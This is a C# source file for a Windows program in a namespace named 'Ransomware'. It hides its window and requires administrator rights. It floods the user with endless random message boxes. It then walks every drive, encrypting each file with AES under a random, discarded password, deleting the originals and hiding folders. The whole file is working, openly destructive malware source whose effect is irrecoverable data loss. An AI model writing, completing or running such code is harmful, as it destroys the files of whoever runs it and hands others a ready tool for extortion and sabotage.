// --------------------------------------------------------------------------------------------------------------------
// <copyright file="Main.cs" company="Hämmer Electronics">
//   Copyright (c) All rights reserved.
// </copyright>
// <summary>
//   The main form.
// </summary>
// --------------------------------------------------------------------------------------------------------------------

namespace Ransomware;

/// <inheritdoc cref="Form"/>
/// <summary>
/// The main form.
/// </summary>
public partial class Main : Form
{
    /// <summary>
    /// The ramdom class.
    /// </summary>
    private readonly Random random = new();

    /// <summary>
    /// Gets or sets the configuration.
    /// </summary>
    [NotNull]
    private Config.Config? Config { get; set; }

    /// <summary>
    /// Gets or sets the main thread.
    /// </summary>
    [NotNull]
    private Thread? Thread { get; set; }

    /// <summary>
    /// Initializes a new instance of the <see cref="Main"/> class.
    /// </summary>
    public Main()
    {
        this.InitializeComponent();
        this.Configure();
    }

    /// <inheritdoc cref="Form"/>
    protected override void SetVisibleCore(bool value)
    {
        base.SetVisibleCore(false);
    }

    /// <summary>
    /// Configures the form.
    /// </summary>
    private void Configure()
    {
        CheckAdminPrivileges();
        this.LoadConfig();
        this.SpamUser();
        this.InitThread();
    }

    /// <summary>
    /// Checks the admin privileges.
    /// </summary>
    private static void CheckAdminPrivileges()
    {
        if (IsElevated())
        {
            return;
        }

        MessageBox.Show("The program must be run in administrator mode", "Program in admin mode", MessageBoxButtons.OK, MessageBoxIcon.Error);
        Environment.Exit(0);
    }

    /// <summary>
    /// Checks whether the current process is run as elevated user or not.
    /// </summary>
    /// <returns>A value indicating whether the current process is run as elevated user or not.</returns>
    private static bool IsElevated()
    {
        var id = WindowsIdentity.GetCurrent();
        return id.Owner != id.User;
    }

    /// <summary>
    /// Hides the given directory.
    /// </summary>
    /// <param name="directory">The directory.</param>
    private static void HideDirectory(string directory)
    {
        var directoryInfo = new DirectoryInfo(directory);

        if ((directoryInfo.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
        {
            directoryInfo.Attributes |= FileAttributes.Hidden;
        }
    }

    /// <summary>
    /// Loads the configuration.
    /// </summary>
    private void LoadConfig()
    {
        try
        {
            this.Config = Import.LoadConfigFromXmlFile(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Config.xml"))
                ?? throw new InvalidOperationException("The configuration file was invalid.");
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message + ex.StackTrace, ex.Message, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }

    /// <summary>
    /// Spams the user.
    /// </summary>
    private void SpamUser()
    {
        while (true)
        {
            try
            {
                var message = this.GetRandomMessage();
                MessageBox.Show(message.Name, message.Caption, this.GetRandomButtons(), this.GetRandomIcon());
                Thread.Sleep(this.random.Next(2300));
            }
            catch
            {
                // ignored
            }
        }
    }

    /// <summary>
    /// Gets a random message.
    /// </summary>
    /// <returns>A random message.</returns>
    private TextMessage GetRandomMessage()
    {
        return this.Config.Messages.ElementAt(this.random.Next(this.Config.Messages.Count));
    }

    /// <summary>
    /// Gets the random buttons.
    /// </summary>
    /// <returns>The random buttons.</returns>
    private MessageBoxButtons GetRandomButtons()
    {
        var values = Enum.GetValues(typeof(MessageBoxButtons));
        var value = (MessageBoxButtons?)values.GetValue(this.random.Next(values.Length));
        return value ?? MessageBoxButtons.OKCancel;
    }

    /// <summary>
    /// Gets the random icon.
    /// </summary>
    /// <returns>The random icon.</returns>
    private MessageBoxIcon GetRandomIcon()
    {
        var values = Enum.GetValues(typeof(MessageBoxIcon));
        var value = (MessageBoxIcon?)values.GetValue(this.random.Next(values.Length));
        return value ?? MessageBoxIcon.Question;
    }

    /// <summary>
    /// Initializes the thread.
    /// </summary>
    private void InitThread()
    {
        this.Thread = new Thread(this.Run);
        this.Thread.Start();
    }

    /// <summary>
    /// Runs the main thread.
    /// </summary>
    private void Run()
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            try
            {
                this.EncryptFs(drive.Name);
            }
            catch
            {
                // ignored
            }
        }
    }

    /// <summary>
    /// Encrypts the given directory.
    /// </summary>
    /// <param name="directory">The directory.</param>
    private void EncryptFs(string directory)
    {
        foreach (var file in Directory.GetFiles(directory))
        {
            try
            {
                if (file is null)
                {
                    continue;
                }

                var resultFile = Path.Combine(directory, Path.GetFileNameWithoutExtension(file)) + ".encrypted";
                AesCrypt.Encrypt(this.GetRandomPassword(), file, resultFile);
                File.Delete(file);
            }
            catch
            {
                // ignored
            }
        }

        foreach (var dir in Directory.GetDirectories(directory))
        {
            HideDirectory(dir);
            this.EncryptFs(dir);
        }
    }

    /// <summary>
    /// Gets the random password.
    /// </summary>
    /// <returns>The random password.</returns>
    private string GetRandomPassword()
    {
        var alg = SHA512.Create();
        alg.ComputeHash(Encoding.UTF8.GetBytes(DateTime.Now.ToLongDateString() + this.random.Next(int.MaxValue)));
        return BitConverter.ToString(alg.Hash ?? Array.Empty<byte>());
    }
}